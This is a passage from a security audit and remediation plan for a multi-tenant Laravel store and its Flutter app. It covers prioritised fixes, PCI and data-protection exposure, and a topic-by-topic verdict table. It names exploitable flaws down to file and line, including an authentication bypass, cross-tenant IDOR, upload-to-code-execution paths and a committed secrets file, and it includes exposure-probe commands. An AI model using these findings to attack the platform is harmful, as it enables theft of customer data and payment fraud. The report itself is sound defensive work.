a `.env.testing` with `APP_ENV=testing`, `DB_CONNECTION=sqlite`, `DB_DATABASE=:memory:` (`pdo_sqlite` is
confirmed present). Then write, **before** any P0-B work: (a) a two-tenant cross-tenant access test
asserting 403/404 for every list and mutate endpoint; (b) an auth test asserting 401 for every API route
with no header and with a forged `<id>|wrong-secret` token; (c) a test asserting `type` cannot be set from
any request. **Test (b) should be written before item 2 ships, so you can prove the fix actually landed.**
*Risk: some module code may assume MySQL-specific SQL, so a few tests may error under SQLite — a visible
failure, strictly better than silent destruction.*

**7. Resolve the duplicate route registration.** *(Section 2.2(a).)* `repo-A bootstrap/app.php:8-14` and
`repo-A app/Providers/RouteServiceProvider.php:35-42` both register `web.php` and `api.php`. Run
`php artisan route:list` on staging and remove the redundant registration. **This is the first thing to
confirm**, because it bears on the severity of SEC-04, SEC-06, SEC-14, SEC-26 and SEC-32, and because any
test written against the wrong stack is worthless.

**8. Stop logging credentials, and purge the logs.** *(SEC-25.)* Collapse the two byte-identical
middlewares into one and replace `$request`/`$response` with an explicit field allowlist, redacting
`password`, `password_confirmation`, `old_password`, `new_password`, `otp`, `token`. Remove `$response`
logging entirely — it contains issued tokens. **Then treat `storage/logs/api.log*` on the server as a
credential dump and revoke every token found there.** In Repo B, do the equivalent (SEC-20): one `Logger`
construction change at `repo-B lib/network/network.dart:29-38` silences the whole network layer in release,
and **delete** `repo-B lib/core/controller/auth/auth_controller.dart:152,164`.

**9. Production environment hygiene.** Set `APP_DEBUG=false`, `APP_ENV=production`,
`SESSION_SECURE_COOKIE=true`, `SESSION_SAME_SITE=lax`, `SESSION_ENCRYPT=true`; restore the stock
`'lax'` default at `repo-A config/session.php:202` so a missing variable fails safe (SEC-31). Fix the
Laravel 10 → 11 key names — `MAIL_DRIVER`→`MAIL_MAILER`, `QUEUE_DRIVER`→`QUEUE_CONNECTION`,
`BROADCAST_DRIVER`→`BROADCAST_CONNECTION` — and add `MAIL_FROM_ADDRESS`/`MAIL_FROM_NAME` (Section 4.3).
*Risks: `SameSite=lax` can break gateway callbacks that POST into a session — test the CSRF-exempt list;
`SESSION_ENCRYPT` logs everyone out once; `APP_DEBUG=false` masks errors the team currently relies on
seeing, so land error tracking (P1/15) alongside it; **turning mail on for real immediately starts sending
to real customers** — verify templates on a staging mailbox first.*

**10. Run the two checks that are currently BLOCKED.** From outside the sandbox, by hand, today:
`curl -I https://<host>/.git/config`, `/composer.lock`, `/error_log`, `/install`, `/update`. **If
`/.git/config` returns 200, SEC-32 becomes CRITICAL and item 1 becomes an emergency rather than a
priority.**

### P0-B — Close the money and code-execution paths (weeks)

**11. NO-GO on live payments until the money path is verified server-side.** *(SEC-11, SEC-12.)* Recompute
**every** money component server-side at order creation — subtotal, shipping, tax, discount — and treat
client figures as display hints to be compared, not trusted. Verify every gateway return server-side by
reading the gateway's own transaction status **and comparing the captured amount**. Wrap order creation
plus stock decrement in a transaction with `lockForUpdate`; add a quantity-versus-stock check; make
`product_stock` unsigned with a floor; fix the `$product['qty']` shadowing in both restore paths plus the
API entry point and the AuctionProduct copy. **Reuse:** `handlePaymeraCallback`
(`repo-A app/Http/Controllers/PaymentController.php:74-104`) is the correct template — re-poll, check
status, guard replay. *Risk: touching live checkout. Do it gateway by gateway, starting with whichever is
actually enabled, and leave disabled gateways disabled.*

**12. Fix the upload chokepoint and close the two RCE paths.** *(SEC-15, SEC-08.)* Validate
unconditionally in `repo-A app/Models/Utility.php:362,369`; add a **code-level** extension allowlist the
DB setting can only narrow; **generate filenames server-side** (killing the attacker-controlled extension
across all 113 sites at once); move the `theme` disk root off `base_path('')`; replace `0777` with `0755`.
Add `type == 'super admin'` checks to `AddonController::ThemeInstall` and `ModuleController::install`
(copy `AddonController.php:21`), validate archive entries before extraction, extract outside the webroot,
and add an `is_enable = 1` filter at `repo-A app/Providers/PackageServiceProvider.php:32`. **Reuse: all
uploads already funnel through one helper** — zero direct `->store(`/`->move(` calls — so one fix
inherits to 146 call sites. *Sequencing: ship validation + allowlist + filenames before moving the disk
root, which requires migrating stored paths.*

**13. Derive the tenant from the session, never from the request, and make authorization enforced.**
*(SEC-10, SEC-04, SEC-09, SEC-26, SEC-27.)* Add a `TenantScope` global scope to every `store_id`-bearing
model so the ~126 unscoped child queries become safe without editing them; add middleware that resolves
the tenant from the authenticated user and **ignores** `$request->store_id`; scope the route-model-bound
`Role`, `Coupon`, `Order` and `OrderRefund` actions; mine the 362 existing `isAbleTo()` call sites to
generate route-level `permission:` middleware (laratrust's middleware is already auto-registered at
`repo-A config/laratrust.php:195` and already aborts 403 — exactly how `repo-A routes/web.php:164` works
today). Seed the six missing Finance permissions. Remove "Edit Role"/"Delete Role" from the bulk merchant
grant at `repo-A app/Models/Utility.php:2872-2873`. Remove `type`, `created_by`, `plan_id`, `is_active`,
`is_enable_login`, `current_store` and `remember_token` from `User::$fillable` and replace
`$user->fill($request->all())` with explicit assignment. **Risks: the highest in this document.** A global
scope changes hundreds of query results including 39 DataTables and the legitimate super-admin cross-store
views; adding middleware to ~1,192 routes breaks things loudly, so stage it starting with destructive and
financial routes and keep the inline checks as belt-and-braces; **and treat the `null` return from
`getCurrentStore()` as load-bearing** — making it fall back to a default store would turn several HIGH
findings CRITICAL. **Prerequisite: item 6's cross-tenant test suite.** Do **not** set
`repo-A config/laratrust.php:285` `panel.register => true` without first fixing `:327`.

**14. Make the schema reproducible from source.** *(Section 4.2.)* Dump production schema-only, diff it
against what the 207 migrations produce, and commit the difference — 15 tables and 3 columns — as new
migrations. Fix `repo-A database/seeders/DatabaseSeeder.php:18-28` to run `package:migrate` with no
argument, remove the `Artisan::call('migrate')` from inside the seeder, and commit the `storage/`
skeleton `.gitkeep` files while narrowing `repo-A .gitignore:5`. **Nothing else in this plan is durable
until this exists**, because without it no staging environment can be stood up to verify any of it.

### P1 — Structural (weeks to months)

**15. Replace the backup module with a real, scheduled, encrypted, off-site backup — and build a tested
restore.** *(SEC-19.)* Adopt `spatie/laravel-backup`: scheduled daily, encrypted with a key held outside
the repo, off-box destination, `.env` and `vendor/` excluded, retention policy, failure notifications.
Then remove `BackupRestore`, or at minimum add the missing `isAbleTo` gate to `store()`, replace
`shell_exec` with `Process::run([...])` using array arguments and `MYSQL_PWD` via environment, and drop
the `0777` chmods. **Write and rehearse a restore runbook — there is none, and `show`/`edit`/`update` are
empty stubs.** *Prerequisites: `mysqldump` on PATH and outbound object storage (both often blocked on
cPanel — see item 19), an encryption-key custody plan, and RPO/RTO decisions from the business.*

**16. Fix observability.** Configure larabug properly (`LB_KEY`, `LB_PROJECT_KEY`, and add the real
`APP_ENV` to `repo-A config/larabug.php:38-40`) or replace it with Sentry. In Repo B, flip
`firebase_crashlytics_collection_enabled` to `true` at
`repo-B android/app/src/main/AndroidManifest.xml:35-37` — **after** item 8, so logged passwords do not
reach Crashlytics. *Expect a backlog of latent production exceptions; that is the point, but it needs
triage capacity.*

**17. Delete the XSS middleware; adopt real escaping plus a CSP.** *(SEC-35, SEC-28, SEC-23.)* Extract the
pending-migration logic at `repo-A app/Http/Middleware/XSS.php:27-49` into its own middleware **first**
(SEC-33 depends on that redirect), then delete `:51-60` and the `'xss'` alias. Add an HTML sanitiser —
**this is one of the few places a new dependency is genuinely required**, since `konekt/html` is a form
builder, not a sanitiser — and apply it **on write** to rich-text fields. Convert the SEC-28 sinks to
`{{ }}`, use `@json()` for the JS-context ones, and remove `first_name`/`email`/`mobile` from the
`rawColumns` list at `repo-A app/DataTables/CustomerDataTable.php:94`. Ship the CSP in **report-only** mode
first. **A one-off cleanup pass over existing stored descriptions, testimonials and ticket bodies is
required** — sanitising on write does not clean existing rows.

**18. Remove the unjustifiable CSRF exclusions, convert state-changing GET routes, close the installer, and
fix 2FA.** *(SEC-29, SEC-33, SEC-30.)* Remove `repo-A bootstrap/app.php:48,49,57,60,62`; change
`Route::any` at `repo-A routes/customer.php:61` to `POST`; convert the privileged GET routes to POST or
DELETE, prioritising `store-reset-password`, `deliveryboy/reset-password` and `user-enable-login`. Remove
`rachidlaasri/laravel-installer` and its published views, or set `installedAlreadyAction => 'abort'` and
`updaterEnabled => false`. Gate the authenticated route group on a post-verification session flag
(mirroring the Duo2FA pattern at `repo-A app/Http/Middleware/EmailIsVerified.php:46-52`) and delete the
secret-propagation block at
`repo-A packages/workdo/GoogleAuthentication/src/app/Http/Controllers/GoogleAuthenticationController.php:35-41`.
Also fix the social-login password literal and identity matching (SEC-17), and **force a reset for every
customer with a social id**. *Risk: exempting login is sometimes a workaround for a session bug — if
re-enabling CSRF breaks login, find the real cause rather than re-exempting.*

**19. Decide the hosting model, and move the document root.** *(SEC-32, Section 4.5.)* Point
`DocumentRoot` at `public/` and delete the root `index.php` and `.htaccess` — **on staging first**, since
this is the one change that can visibly break the site. Evaluate moving off cPanel shared hosting;
produce a `Dockerfile` + `docker-compose.yml` (PHP 8.3-fpm, MySQL, Redis, a `queue:work` worker, a
`schedule:run` sidecar, Reverb) and either make `laravel/sail` functional or remove it. **Deciding this
once unblocks items 15, 20 and 21.**

**20. Wire the scheduler and the queue.** *(Section 4.3.)* Add the `Schedule` import to
`repo-A routes/console.php`; schedule `zid:refresh`, `auction:order`, `partial:preorder`,
`partial:payment` and `lottery:order` with `->withoutOverlapping()`; install the
`* * * * * php artisan schedule:run` cron entry and a `queue:work` supervisor program; regenerate
`.env.example` from the union of both key sets so it is actually usable (25 keys in `.env` are missing
from it, including **all six `DB_*`**). *Risk: scheduling `auction:order`/`lottery:order` on live data for
the first time may process a backlog of stale auctions and draws — dry-run against a database copy.*

**21. Stand up CI.** `composer validate`, the `php -l` sweep (already green over 3,113 files — lock that
in), `pint --test`, and `phpunit` against SQLite; plus `composer audit` and `npm audit`. Add
`flutter pub get && flutter analyze && flutter test` for Repo B, starting non-blocking. *Risk: the first
run will go red — `repo-B` alone has ~314 deprecated `withOpacity` calls plus duplicate map keys and a
dead null-aware expression. **Snapshot the baseline and block only new issues**, rather than disabling
CI.*

**22. Repo B release readiness.** *(SEC-21, SEC-34, SEC-36, Section 1.11, Section 4.6.)* Create a real
release signing config and escrow the keystore **outside the repo, in two places, before first upload**;
add `isMinifyEnabled`/`isShrinkResources`. Move the token to `flutter_secure_storage` (after item 8).
Delete the five `apps.rajodiya.com` URLs and let the avatar fall through to the existing icon fallback.
**Resolve the Syncfusion licence question — ask the owner now, it has a long lead time and a cost either
way.** Wire `flutter_localizations` (~6 lines) and budget a full Arabic UI re-review. Correct
`pubspec.yaml:22`, pin the Flutter version, and delete `test/widget_test.dart` so the suite goes from red
to honestly empty. Fix the `bool.parse` launch crash. Decide iOS: clear the path (Podfile, real privacy
strings, `NSCameraUsageDescription`, re-register the Firebase iOS app under the correct bundle id) or
**scope it out explicitly and ship Android first.**

### P2 — Hygiene and debt

**23.** Harden Repo B's data layer: extend the three hardened models' defensive container checks to the
other 26, add `num.tryParse`-based coercion helpers instead of raw `as int?` casts, annotate the 17
untyped repository methods, and add dedup or `unregister` to `StoreChangeService` (fixing its misleading
comment). *Do this per-feature, after item 21, starting with orders.* **24.** Decide *finish or delete* —
not *leave* — for Repo B's half-built features: ~640 lines of commented-out payment configuration, the two
dead social-login buttons, notification tap routing, 12 dead route constants, 6 unreferenced files.
*A 30-minute scope conversation with the owner unblocks honest estimation of everything else.*
**25.** Dependencies: pin `maatwebsite/excel`, constrain `myfatoorah/laravel-package`, migrate off the
three abandoned packages, drop Repo B's 10 unused ones. **26.** Repo hygiene: `git rm --cached` the junk
(`composer.phar`, `error_log`, `_active', 1)`, `avatar.png`, `bootstrap/cache/*`, the 70 `"`-quoted paths,
`uploads/`) — **fold this into item 1's history rewrite so history is rewritten once, not twice.**
**27.** Remove the `lab404/laravel-impersonate` trait from `repo-A app/Models/User.php:14,25` and the
dependency — it is unwired today and defaults to "anyone may impersonate anyone" if routes are ever added
(R-20). **28.** Replace the stock README with real install, deploy and runbook documentation, including the
`php artisan package:migrate` step that exists nowhere. **29.** Repo B structural debt: migrate the 34
ad-hoc `Get.put` calls into bindings, retire the global mutable `AppColor` statics in favour of
`Theme.of(context)`, document or merge the two widget layers, consolidate the duplicate bottom sheets and
snackbar systems. *Pure refactoring with no tests is how working software breaks — do none of this before
item 21.*

### P3 — Later

**30.** Certificate pinning in Repo B. **31.** Accessibility in Repo B — `grep "Semantics(\|semanticLabel"
lib/` returns **0** across 198 files and 47 screens, so icon-only controls expose no label to TalkBack or
VoiceOver. **32.** Delete Repo B's four non-functional platform targets (`web/`, `windows/`, `linux/`,
`macos/` — 62 tracked files of `flutter create` residue carrying the wrong branding). **33.** Align the
product identity: `repo-B ios/Runner/Info.plist:10` says "Syria Store" while
`repo-B android/app/src/main/AndroidManifest.xml:14` says "Store Syria" — a store-listing defect. *(The
Dart package rename `store_go_app` is **not** worth doing: it touches the import line of all 198 files for
zero user-visible benefit.)* **34.** Ask the owner whether the "Powered by Lynomia" link on the login
screen (`repo-B lib/view/widget/powered_by_lynomia.dart:6,14,18`, rendered at
`repo-B lib/view/screen/auth/login_widget.dart:228`) is contractually agreed — a business question,
flagged not answered. **35.** Fix the LOW-severity items: the 8 `strip_tags()` inconsistencies, the dead
RTL stylesheet references in the three standalone payment views (R-14), the second-order `whereRaw` in the
AuctionProduct Blade view.

---

## 8. Compliance and regulatory exposure

**Read this section as engineering-identified exposure requiring qualified legal advice. It is NOT legal
advice, and nothing in it is a legal conclusion.** No lawyer, no PCI Qualified Security Assessor and no
data-protection adviser was involved in producing it. What this audit can do is state what the code
provably does and hand counsel the technical premises; what regime applies, what obligations follow and
what must be notified to whom are questions only qualified advisers in the relevant jurisdictions can
answer. The rest of this report contains no occurrence of PCI, GDPR or breach notification, which is itself
a gap: the platform takes card payments across ~52 gateway integrations, stores customer PII and has 407
customer- and merchant-uploaded files in version control. Every technical premise below is cited; where the
answer cannot be read from the repository it says **UNKNOWN**.

### 8.1 PCI-DSS scope, and which SAQ type the architecture implies — questions to counsel and to the acquirer

**Technical premise 1 — raw card data reaches the application server on at least two wired rails.** This is
the premise that decides everything else, and it is proven in code, not inferred:

- `repo-A resources/views/payment/authorizenet.blade.php:35` posts the form to the application's **own**
  route (`route('order.get.authorizenet.status', $slug)`, registered at `repo-A routes/customer.php:159`),
  and `:59` and `:66` of that view are plain `<input name="cardNumber">` and `<input name="cvv">` fields.
  The server then reads them: `repo-A app/Http/Controllers/AuthorizeNetPaymnetController.php:111,113`
  (and again at `:246,248`) does `$creditCard->setCardNumber($input['cardNumber'])` and
  `setCardCode($input['cvv'])`.
- `repo-A resources/views/front_end/payment/nmi-payment.blade.php:74,94` are plain
  `name="nmi_card_number"` and `name="nmi_cvv_code"` inputs, and
  `repo-A app/Http/Controllers/NMIPayController.php:93` (and `:184`) forwards
  `'ccnumber' => $request->nmi_card_number` and `'cvv' => $request->nmi_cvv_code` to the acquirer from the
  server. The route is `repo-A routes/customer.php:228`.
- Further server-rendered card-entry views exist and were **not** individually traced:
  `repo-A resources/views/payment/nmi-payment.blade.php`,
  `repo-A resources/views/plans/Powertranz-payment.blade.php`,
  `repo-A resources/views/plans/Powertranz-planpayment.blade.php`,
  `repo-A resources/views/plans/cybersourcerequest.blade.php`, `repo-A resources/views/DPO/pay.blade.php`
  and `repo-A packages/workdo/Campaigns/src/resources/views/payment/nmi.blade.php:63,67`.

**The question for counsel and for the acquirer.** "Is every gateway a redirect or a hosted field?" is the
question that separates SAQ A from the far heavier SAQ A-EP / SAQ D obligations. **On the evidence above
the answer is no, for at least two rails:** the primary account number and the CVV are submitted to this
application's own server and handled in its own PHP process. Whether that places the operator inside the
scope counsel and the acquirer would assign, and which SAQ the acquirer would require, is **for them to
determine** — engineering can only report that the "card data never touches our server" simplification is
not true of this codebase as written.

**What is UNKNOWN.** Which of the ~52 wired gateways are actually enabled is settings-driven and **cannot
be read from the repository** (Appendix B item 4; doc 10 M-05) — so the operator may or may not be
operating the two rails above today. ~44 of the ~52 gateway callbacks were **NOT READ** (`10-OPEN-QUESTIONS-AND-DECISIONS.md` §2.2, row "08 Commerce core"), so
how many further rails take card data server-side is **UNKNOWN**, and the two found are a floor. **No
cardholder-data-at-rest audit was performed:** this audit did not search for a stored PAN, and whether the
production database holds card data in any column is **UNKNOWN** (no database access, Appendix B item 4).
That search should be the first technical task if the operator is found to be in scope.

**Premises that would weigh against any SAQ attestation, all confirmed elsewhere in this report:** the API
authenticates a bearer token by row id and never compares the secret and passes anonymous requests through
(SEC-01); there is no rate limiting (SEC-24); session cookies carry no `Secure` and no `SameSite` flag on
an HTTPS site and `APP_DEBUG=true` on a production domain (SEC-31); the document root is the application
root rather than `public/` (SEC-32); there is no CSP and no security header of any kind (SEC-28); logging
writes plaintext passwords and bearer tokens into a file inside the webroot (SEC-25); and **there is no
restore capability at all** (SEC-19, Section 4.2). Separately, **PCI-DSS v4 requires that payment-page
scripts be managed and their integrity assured** — this codebase has no CSP, no subresource integrity and
2,392 unescaped Blade sinks (SEC-28), which is a technical premise counsel will want.

### 8.2 Data-protection regime, and cross-border transfers — questions to counsel

**Technical premise 2 — customer personal data is collected, stored and transferred out of the operator's
own infrastructure.** What the code does:

- **Gateways.** Checkout forwards customer and order data to third-party acquirers from the server; the NMI
  call at `repo-A app/Http/Controllers/NMIPayController.php:88-96` posts cardholder name and card data to
  an acquirer endpoint, and the ~52-gateway surface means the set of recipients depends on which gateways
  are enabled — which is **UNKNOWN** (above).
- **Firebase.** `repo-A config/services.php:108-111` configures a Firebase project and `:114-117` a second,
  delivery-specific Firebase project (the credentials path is a repo-relative default; the credential
  values themselves are not reproduced here). Push notification delivery therefore routes device and
  notification data through Google infrastructure.
- **AWS S3 / Wasabi.** `repo-A config/filesystems.php:53-63` defines an `s3` disk and `:65-72` a
  `wasabi` disk, both driven by `env()` keys. Which disk is live is settings- and environment-driven and is
  **UNKNOWN** (Appendix B item 4) — but if `s3` or `wasabi` is selected, customer-uploaded files leave the
  operator's own hosting.

**The questions for counsel.** Which data-protection regime plausibly governs Syrian customer data and
which governs Kuwaiti customer data; whether the operator's establishment, targeting or the residence of
any customer pulls any customer segment into a regime with extraterritorial reach (GDPR being the obvious
candidate to rule in or out, given it would change the obligation set substantially); what lawful basis and
what transfer mechanism each of the three cross-border flows above requires; and whether a processor
agreement is needed with each gateway, with Google/Firebase and with the object-storage provider.
**Engineering cannot answer any of these.** What engineering can say is that the flows exist, that they are
cited above, and that **no privacy policy, no data-processing agreement, no consent record and no data-map
artefact of any kind exists in either repository** —
`grep -rli "privacy policy|data processing agreement|data protection officer"` (as an `-E` pattern) over
both checkouts' `*.md` and `*.txt` files, excluding this `docs/discovery/` set, returns nothing.

### 8.3 Breach notification — what the confirmed anonymous read paths would trigger

**Technical premise 3 — personal data is readable without authentication, confirmed in source.** If any of
these were exploited, the operator would be dealing with a personal-data breach on the facts, not a
hypothetical:

| Confirmed path | What it discloses | Actor needed |
|---|---|---|
| SEC-01 — `custom.auth` never compares the token secret and passes anonymous requests through (`repo-A app/Http/Middleware/CustomAuth.php:32-34`, `:54`) | the authenticated API surface, i.e. customer and order data | none |
| SEC-04 — seven admin API list endpoints with no auth, tenant taken from the query string (`repo-A routes/api.php:163-169`) | tenant-wide list data, any tenant | none |
| SEC-05 — unauthenticated cross-tenant order IDOR chain (`repo-A app/Http/Controllers/OrderController.php:360-362`, `:373`) | order contents and the customer details on them, any tenant | none |
| SEC-13 — unauthenticated disclosure of any merchant's Zid orders using their decrypted credentials (`repo-A routes/web.php:978-980`; `repo-A app/Services/Zid.php:11,15-16`) | third-party order data plus the merchant's integration credentials | none |
| SEC-37 — cross-tenant user-edit IDOR on the `users` table (`repo-A app/Http/Controllers/UserController.php:212`) | read **and write** of any tenant's user rows | an `Edit User` permission |

**The questions for counsel.** Which of the plausible regimes imposes a notification duty, on what clock,
to which authority and to which data subjects; and whether the **absence of evidence** changes the answer —
because it bears directly on a technical fact this audit established. **The operator cannot currently prove
whether any of these paths was ever exploited.** There is no CI, no business-logic test and no restore
capability (Section 4.2, Section 5); error tracking is dead twice over (Section 4.4); the only request log
writes into the webroot with 15-day retention (SEC-25); and `storage/logs/` does not exist in the checkout
so even its contents are inferred (Appendix B item 9). Counsel should be told plainly that **a forensic
"has this been exploited?" determination is not currently possible from the available telemetry**, and that
some regimes treat an inability to exclude access differently from evidence of no access.

### 8.4 Two disclosure events that have already materialised

These are not risks. On the evidence they have already happened, and both are candidates for being
reportable in their own right:

**(a) A production `.env` containing live secrets is committed and still tracked.** SEC-16: `.env` is
tracked (commit `3c39c160`) and `.gitignore` never mentions it; `repo-A config/services.php:31,34` holds
hardcoded third-party OAuth secrets. Verify with `git ls-files .env`. No secret value is reproduced
anywhere in this report; the variables are named by `file:line` in SEC-16. **Every credential in that file
must be treated as disclosed to everyone who has ever had read access to the repository, and the remedy is
rotation, not deletion of the file** — removing it from HEAD leaves it in history.

**(b) 407 customer- and merchant-uploaded files are committed to version control.**

```
$ git ls-files uploads/ | wc -l
407
```

This is also the figure cited in SEC-16 and SEC-32. The correct characterisation is the one Section 3
established and this section does not overstate: **R-5 refuted the claim that `uploads/receipt/` is a
financial-PII dump** — it holds exactly one file, as does `uploads/profile/` — and the bulk of the 407 are
per-tenant store assets under numbered tenant directories — `uploads/2/` 188 files, `uploads/uploads/` 105,
`uploads/15/` 45, `uploads/11/` 25, `uploads/16/` 15, `uploads/19/` 13, `uploads/3/` 8, `uploads/18/` 3, and
single files under `uploads/stylique/`, `uploads/receipt/` and `uploads/profile/`
(`git ls-files uploads/ | awk -F/ 'NF>2{print $2}' | sort | uniq -c | sort -rn`). So: **what is proven is cross-tenant asset exposure to anyone with repository
access, plus repository bloat; a confirmed customer-PII leak is NOT proven and should not be asserted.**
Counsel still needs to see it, for two reasons: the tree was never triaged file-by-file, so whether any
individual file contains personal data is **UNKNOWN**; and SEC-32 means the same tree is web-served from the
application root in production. Whether either (a) or (b) is itself a reportable event is a question for
counsel, not for this document.

### 8.5 Data-subject rights — export and erasure against this schema

**Technical premise 4 — customer soft-delete is declared against a column that has no migration.**
`repo-A app/Models/Customer.php:16` imports `Illuminate\Database\Eloquent\SoftDeletes` and `:20` applies
the trait, so every `Customer` query filters on `deleted_at` and every delete writes it. But
`grep -rn "deleted_at\|softDeletes" database/migrations/ | grep -i customer` returns **nothing**, and
`repo-A database/migrations/2023_12_15_112855_create_customers_table.php` is the only `customers` migration
there is. Doc 10 (M-05) reaches the same conclusion independently: `customers.deleted_at` appears in zero
migrations repo-wide. **Consequence:** from a clean checkout the column does not exist, so customer reads
and deletes raise a database error; in production the column may exist out of band, which is exactly the
Section 4.2 problem — **the production schema is the only authoritative copy and it exists nowhere in
version control**, so whether erasure works today is **UNKNOWN and cannot be determined from the
repository.**

**Technical premise 5 — there is no export, no erasure and no retention mechanism.** Neither repository
contains a data-export endpoint for a customer's own data, an erasure or anonymisation routine, a retention
schedule, or any artefact implementing a data-subject request. The only deletion primitive is the soft
delete above, which (i) does not erase anything, by design, and (ii) rests on a column with no migration.
The 407 committed uploads (§8.4b) are a second problem for erasure specifically: **git history cannot be
erased per-subject without rewriting it**, and any clone already taken keeps the data.

**The questions for counsel.** Whether the applicable regime grants export and erasure rights to these
customers; what the lawful retention period for order and payment records is, since that normally limits
erasure and nothing in this codebase encodes any period; and how an erasure request can be satisfied at all
against committed uploads and a schema whose authoritative definition is not in version control. **For
engineering, the prerequisite is Section 4.2: a reproducible schema. No credible erasure or export
capability can be built on a schema that cannot be rebuilt from source.**

### 8.6 What this section does not say

It does not say that the operator is in PCI-DSS scope, that any particular data-protection regime applies,
that any notification duty has been triggered, or that any specific breach has occurred. It says that the
technical premises for each of those questions are now cited, that several of them are confirmed defects
and two are already-materialised disclosures, and that **the questions need a qualified answer before the
platform takes a real customer's card.** The engineering prerequisites — SEC-01, SEC-11, SEC-16, SEC-19,
SEC-32, SEC-37 and Section 4.2 — are already in the P0 list in Section 7; this section adds no new
engineering work, only the advice the owner should take in parallel.

---

## Appendix A — Coverage of every required security topic

Including the topics where **no issue was found**, stated explicitly rather than omitted.

| Topic | Verdict | Where |
|---|---|---|
| **Authentication** | **CRITICAL defects.** API token secret never verified and fail-open with no header; unauthenticated password overwrite of any user; unauthenticated API password reset; hardcoded `1234` across 9 social addons; 4-digit plaintext OTP; `hello@1234` literal | SEC-01, SEC-02, SEC-03, SEC-17, SEC-24 |
| **Authorization / role isolation** | **CRITICAL.** 1 of ~1,193 routes carries a permission middleware; no `app/Policies`; laratrust gates and teams disabled; any self-registered merchant can rewrite or delete the `super admin` role; 6 of 10 finance endpoints locked out while 3 are unprotected | SEC-09, SEC-10, SEC-26 |
| **Cross-tenant leakage** | **CRITICAL.** No global scopes or tenant traits; isolation is 487 hand-written `where('store_id', getCurrentStore())` filters (1,260 `where('store_id', …)` clauses of all kinds; commands published in Section 1.3); 7 admin API endpoints take the tenant from the query string; unscoped route-model-bound CRUD | SEC-04, SEC-10, and Section 2.2(c) on the true count |
| **IDOR / BOLA** | **CRITICAL.** Unauthenticated two-hop cross-tenant order IDOR; 30 order/refund mutation routes outside every auth group; `status-cancel` status change plus unbounded stock inflation; unscoped refund write | SEC-05, SEC-06, SEC-07, SEC-27 |
| **SQL injection** | **One confirmed, and the surface is narrow.** 230 raw-SQL sites; exactly **1** interpolates request input. DataTables: clean (negative result) | SEC-22, R-12, R-13 |
| **XSS** | **HIGH.** Confirmed anonymous-to-admin stored chain; 2,392 unescaped Blade sinks; no sanitiser in the dependency set; no CSP; the "XSS middleware" provides **no** protection | SEC-23, SEC-28, SEC-35 |
| **CSRF** | **Protection is ACTIVE** — stated first. But 5 of 30 exclusions are unjustifiable (`/login`, `/duologin`, `*/checkout`, `join_us/store/`, `delivery-syria/status`), one inline `withoutMiddleware`, and ~25 privileged state-changing GET routes where the verb itself is the defect | SEC-29 |
| **File upload** | **CRITICAL.** Validator bypass via a 6th argument, attacker-controlled extension, disk root is the app root, 0777 directories, DB-mutable allowlist including SVG. **Path traversal specifically: REFUTED** | SEC-15, R-7, R-8 |
| **Sensitive data exposure** | **HIGH.** Document root is the app root (composer.lock, error_log, 407 customer uploads, partial Blade markup); `APP_DEBUG=true` on a production domain. **"Full source disclosed" and "git history disclosed": REFUTED/UNVERIFIED** | SEC-32, SEC-16(c), R-1, R-2 |
| **Secret management** | **CRITICAL.** `.env` with live secrets committed and still tracked; `.gitignore` never mentions it; live OAuth secrets hardcoded in a tracked config file. **Clean result: no secret-prefix matches anywhere in either repo** | SEC-16 |
| **Password handling** | **Mixed.** `bcrypt`/`Hash::make` used correctly and `'password' => 'hashed'` cast present — no plaintext storage. But: hardcoded `1234` and `hello@1234` literals; no minimum length or complexity on the admin password-update path (`'required|confirmed'` only); an always-true `=`-instead-of-`==` condition at `repo-A app/Http/Controllers/UserController.php:398`; `same:password` compared against itself at `repo-A app/Http/Controllers/Api/DashboardController.php:3015-3016` with `min:4`; and the XSS middleware **silently truncates passwords containing `alert` or `javascript`** | SEC-17, SEC-35, SEC-24 |
| **Session security** | **HIGH.** No `Secure` flag and no `SameSite` on an HTTPS site (the Laravel 11 `'lax'` default was changed to `null`); `SESSION_ENCRYPT` false. Customer login lacks session regeneration and customer logout lacks invalidation — **the merchant path does both correctly** | SEC-31 |
| **API authentication** | **CRITICAL — the single worst finding.** `custom.auth` on 189 routes verifies the token id and never the secret, and passes anonymous requests through. No `auth:sanctum` anywhere (the one occurrence is commented out) | SEC-01 |
| **Webhook verification** | **Mixed, and this is where the codebase shows it knows better.** Zid events verify a shared secret; `DeliverySyriaOrderController` uses `hash_equals` correctly. **But** `delivery-syria/status` has no auth and no signature and is CSRF-exempt; the duplicate at `repo-A routes/web.php:1026` accepts GET; the Zid check is timing-unsafe and latently fail-open; ~24 gateway callbacks were not individually audited | SEC-14, Section 3.1, Section 2.2(e) |
| **Rate limiting** | **HIGH — effectively absent.** `throttleApi()` never called; 2 of 211 API routes throttled; login limiter is IP-only. This is what makes the enumeration in SEC-01/04/05 practical | SEC-24 |
| **Payment security** | **CRITICAL — NO-GO.** The shared return handler never checks whether payment succeeded. **The census is scoped to what was actually read:** of the **8** gateway callbacks read line-by-line, **2** verify the payment server-side, **0** verify the amount and **0** verify an inbound signature — **the remaining ~44 of the ~52 wired gateways were NOT READ** (`10-OPEN-QUESTIONS-AND-DECISIONS.md` §2.2, "Area-specific unknowns, by dossier", row "08 Commerce core") and are **UNKNOWN**, not clean. Doc 10 expects most unknowns to resolve to "no", but that is an expectation, not a finding. Separately: tax from the request reaches the gateway charge; zero DB transactions and zero row locking in the whole checkout; refunds never move money | SEC-11, SEC-12, SEC-27 |
| **Dependency vulnerabilities** | **MEDIUM — and explicitly NOT a CVE scan.** 3 upstream-abandoned packages (two on the money or install path), a dev-branch constraint and an unconstrained `*` in payment integrations, and 69 addon modules outside any dependency management at all | Section 6 |
| **Logging / audit trails** | **HIGH.** Passwords, OTPs and bearer tokens written in cleartext to a log inside the webroot with 15-day retention; Repo B logs the same to the device with zero release guards. Audit trail exists (`AuditLog`) but **its table has no migration**, its `$oldValues` is used before assignment at `repo-A app/Http/Controllers/UserController.php:246`, and the most security-relevant write (SEC-02) logs nothing at all | SEC-25, SEC-20, Section 4.2, R-24 |
| **Backup / recovery** | **CRITICAL.** The only backup is manual, unencrypted, on-box, archives `.env`, chmods 0777, is shell-injectable, and **has no restore function** — plus the schema cannot be rebuilt from source. **Recovery capability: MISSING** | SEC-19, Section 4.2 |
| **Transport security (Repo B)** | **PASS — no issue found.** No TLS bypass of any kind, no cleartext permission, ATS fully enforced, HTTPS everywhere. Certificate pinning is absent (MEDIUM, P3) but that is the industry default | Section 1.11 |
| **Impersonation** | **MISSING — and that is the good news.** The package is installed and entirely unwired; nobody can impersonate anybody. Latent risk only | R-20 |
